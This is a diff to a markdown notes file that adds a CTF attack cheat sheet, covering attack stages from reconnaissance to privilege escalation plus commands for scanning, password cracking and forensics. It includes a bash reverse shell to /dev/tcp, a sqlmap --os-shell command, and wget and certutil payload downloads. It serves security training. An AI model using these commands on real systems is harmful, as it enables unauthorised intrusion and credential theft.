@@ -1736,12 +1736,6 @@ if __name__ == '__main__':
 
 ---
 
-Ohhh okay 👀 this one is interesting.
-This is clearly a **PHP deserialization / filter chain exploit automation script** written in Python.
-
-Let’s break it down properly.
-
----
 
 # 🧠 What Is The Core Concept?
 
@@ -2443,7 +2437,537 @@ if __name__ == "__main__":
 ```
 
 
+# 🧠 CORE CTF CONCEPTS (Clean Extract)
 
+Forget tools.
+Everything reduces to these core attack ideas:
+
+---
+
+# 1️⃣ Recon & Enumeration (Find the Attack Surface)
+
+Goal:
+👉 Discover entry points.
+
+Core concepts:
+
+* Open ports → exposed services
+* Service version → known vulnerabilities
+* Web app → hidden routes, parameters, tech stack
+* SMB/RPC → shares, users
+* CMS detection → default creds / plugin vulns
+* Subdomain discovery → hidden panels
+* Metadata leakage → usernames, emails
+
+Everything in recon is about:
+
+> Identify what is exposed
+> Identify what is misconfigured
+> Identify what version is running
+
+---
+
+# 2️⃣ Authentication Bypass
+
+Core patterns:
+
+* SQL Injection
+* NoSQL Injection
+* Default credentials
+* Weak password brute force
+* Session tampering
+* Parameter pollution
+* Role manipulation
+
+If login exists, always test:
+
+* Can I bypass logic?
+* Can I change role=admin?
+* Can I inject query operators?
+* Can I force true conditions?
+
+---
+
+# 3️⃣ Injection Vulnerabilities
+
+This is the heart of web exploitation.
+
+Types:
+
+* SQL Injection
+* NoSQL Injection
+* Command Injection
+* SSTI
+* Deserialization
+* Prototype Pollution
+* Template injection
+* Eval injection
+* File inclusion (LFI/RFI)
+
+Core principle:
+
+> If user input reaches interpreter → exploit it
+
+Interpreter examples:
+
+* SQL engine
+* MongoDB query
+* Bash
+* PHP unserialize()
+* eval()
+* Template engine
+* OS command execution
+
+---
+
+# 4️⃣ File System Attacks
+
+Core techniques:
+
+* LFI (Local File Inclusion)
+* Path traversal (../../)
+* Reading config files
+* Reading /etc/passwd
+* Reading flag
+* Upload → execute
+* Zip slip
+* Archive nesting
+
+Pattern:
+
+> If user controls filename → attempt traversal
+
+---
+
+# 5️⃣ Remote Code Execution (RCE)
+
+Everything leads here.
+
+Common paths:
+
+* Command injection
+* Deserialization
+* Insecure eval
+* Prototype pollution → code execution
+* Upload web shell
+* Misconfigured cron
+* SQLMap OS-shell
+* SUID abuse
+
+Goal:
+
+> Get shell
+> Upgrade shell
+> Enumerate system
+
+---
+
+# 6️⃣ Privilege Escalation
+
+After shell:
+
+Linux core vectors:
+
+* SUID binaries
+* sudo -l
+* Writable cron jobs
+* PATH hijacking
+* Kernel exploit (DirtyCow)
+* Capabilities abuse
+
+Windows core vectors:
+
+* Weak services
+* Unquoted service paths
+* SeImpersonate
+* Token abuse
+* Stored credentials
+
+Core mindset:
+
+> Who am I?
+> What can I run?
+> What runs as root?
+
+---
+
+# 7️⃣ Password Attacks
+
+Core methods:
+
+* Wordlist attack
+* Hash cracking
+* Private key cracking
+* Archive cracking
+* SAM dump
+* Shadow file cracking
+
+All tools (john, hashcat) are just wrappers for:
+
+> Hash identification
+> Brute force / dictionary attack
+
+---
+
+# 8️⃣ Cryptography Challenges
+
+Core categories:
+
+* Caesar / substitution
+* Vigenère
+* XOR
+* Base64 layering
+* RSA (weak key, small exponent)
+* OTP misuse
+* Reused key attacks
+
+Core rule:
+
+> Look for encoding before encryption
+> Look for repeated key
+> Look for math weakness
+
+---
+
+# 9️⃣ Forensics
+
+Core techniques:
+
+* strings
+* binwalk
+* metadata extraction
+* steganography
+* mount disk image
+* analyze registry / shadow / SAM
+* PCAP traffic reconstruction
+* USB keystroke recovery
+
+Core idea:
+
+> Extract hidden data
+> Decode embedded layers
+> Reconstruct deleted content
+
+---
+
+# 🔟 Buffer Overflow / Binary Exploitation
+
+Core flow:
+
+* Find offset
+* Control RIP/EIP
+* Inject shellcode
+* ROP chain
+* ret2libc
+* Bypass NX/ASLR
+
+Core idea:
+
+> Control instruction pointer → control execution
+
+---
+
+# 🔥 Real Core Attack Flow (Universal CTF Pattern)
+
+Almost every CTF machine:
+
+1. Recon
+2. Find exposed service
+3. Exploit misconfiguration
+4. Gain initial access
+5. Enumerate locally
+6. Privilege escalate
+7. Capture root flag
+
+Everything in the long article supports that chain.
+
+---
+
+# 🧠 What Actually Matters (If You Remove All Tools)
+
+If I compress entire cheatsheet into 10 words:
+
+> Find input → reach interpreter → execute code → escalate.
+
+That’s it.
+
+---
+
+# 💡 The Real Mental Model
+
+Instead of memorizing commands, think:
+
+* Where does user input go?
+* What parses it?
+* What runs with higher privilege?
+* What is writable?
+* What trusts me?
+
+---
+
+# ⚔️ Core Exploit Categories (Ultra Compressed)
+
+| Category   | Goal           |
+| ---------- | -------------- |
+| Recon      | Find surface   |
+| Injection  | Break logic    |
+| File read  | Leak secrets   |
+| File write | Plant payload  |
+| RCE        | Execute        |
+| PrivEsc    | Become root    |
+| Crypto     | Reverse math   |
+| Forensics  | Extract hidden |
+
+
+
+# 🔎 RECON & SCANNING
+
+### Nmap
+
+```
+nmap -sn <network>
+nmap -sV <ip>
+nmap -sC -sV <ip>
+nmap -T4 -A -p- <ip>
+nmap --top-ports 100 -T4 <ip>
+nmap -sU -T4 <ip>
+nmap -p 80 -sT <ip>
+nmap -oN scan.txt <ip>
+```
+
+### Netdiscover
+
+```
+netdiscover -i <interface>
+netdiscover -r <subnet>
+```
+
+### Banner / Web Check
+
+```
+curl -I http://<ip>
+curl http://<ip>/robots.txt
+whatweb <ip>
+```
+
+---
+
+# 🌐 DIRECTORY ENUMERATION
+
+### Gobuster
+
+```
+gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<ip>/ -w wordlist.txt -x php,txt,bak
+gobuster dir -k -u https://<ip>/ -w wordlist.txt
+```
+
+### WFuzz
+
+```
+wfuzz -u http://<ip>/FUZZ -w wordlist.txt
+wfuzz -c -z file,wordlist.txt --hc 404 http://<ip>/index.php?FUZZ=test
+```
+
+### Dirsearch
+
+```
+python3 dirsearch.py -u http://<ip>/ -e php,html,txt
+```
+
+### Wordlist Generation
+
+```
+cewl -w wordlist.txt -d 5 http://<ip>/
+```
+
+---
+
+# 📂 SMB / RPC
+
+```
+smbclient -L //<ip> -N
+smbclient //<ip>/share
+smbmap -H <ip>
+enum4linux -a <ip>
+rpcclient -U "" <ip>
+```
+
+---
+
+# 🔐 PASSWORD CRACKING
+
+### John
+
+```
+john hash.txt --wordlist=rockyou.txt
+john --show hash.txt
+unshadow passwd shadow > merged.txt
+john merged.txt --wordlist=rockyou.txt
+ssh2john id_rsa > ssh.hash
+john ssh.hash --wordlist=rockyou.txt
+```
+
+### Hashcat
+
+```
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+hashcat --show -m 0 hashes.txt
+```
+
+---
+
+# 🧨 SQLMAP
+
+```
+sqlmap -r request.txt --batch
+sqlmap -r request.txt --dbs
+sqlmap -r request.txt --tables
+sqlmap -r request.txt --dump
+sqlmap -r request.txt --os-shell
+```
+
+---
+
+# 🐚 SHELLS
+
+### Reverse Shell (Bash)
+
+```
+bash -c 'bash -i >& /dev/tcp/<ip>/9001 0>&1'
+```
+
+### Netcat Listener
+
+```
+nc -lvnp 9001
+```
+
+### Shell Upgrade
+
+```
+python3 -c "import pty; pty.spawn('/bin/bash')"
+stty raw -echo; fg
+export TERM=xterm
+```
+
+---
+
+# 🧬 FILE ANALYSIS
+
+### Strings
+
+```
+strings file | grep -i flag
+```
+
+### Binwalk
+
+```
+binwalk file
+binwalk -e file
+binwalk -Me file
+```
+
+### File Type
+
+```
+file filename
+xxd filename | head
+```
+
+---
+
+# 🖼 IMAGE FORENSICS
+
+```
+exiftool image.jpg
+zsteg image.png
+steghide extract -sf image.jpg
+```
+
+---
+
+# 💾 MOUNTING DISK IMAGES
+
+```
+fdisk -l disk.img
+mount -o loop disk.img /mnt
+guestmount --add disk.vhd --inspector -ro /mnt
+```
+
+---
+
+# 🔓 PRIVILEGE ESCALATION
+
+### Linux
+
+```
+sudo -l
+find / -perm -4000 2>/dev/null
+linpeas.sh
+pspy64
+```
+
+### Windows (Meterpreter)
+
+```
+getsystem
+run post/multi/recon/local_exploit_suggestor
+```
+
+---
+
+# 🧠 CRYPTO QUICK
+
+### Base64
+
+```
+echo "encoded" | base64 -d
+```
+
+### ROT13
+
+```
+echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+---
+
+# 📡 PCAP ANALYSIS
+
+```
+strings capture.pcap | grep -i flag
+tshark -r capture.pcap
+tcpdump -r capture.pcap
+```
+
+---
+
+# 🧰 SEARCH EXPLOITS
+
+```
+searchsploit apache
+searchsploit CVE-2021-41773
+searchsploit -x exploits/path.txt
+```
+
+---
+
+# ⚙️ FILE TRANSFER
+
+### Linux
+
+```
+python3 -m http.server 8000
+wget http://<ip>:8000/file
+```
+
+### Windows
+
+```
+certutil -urlcache -f http://<ip>/file.exe file.exe
+```
 
 
 
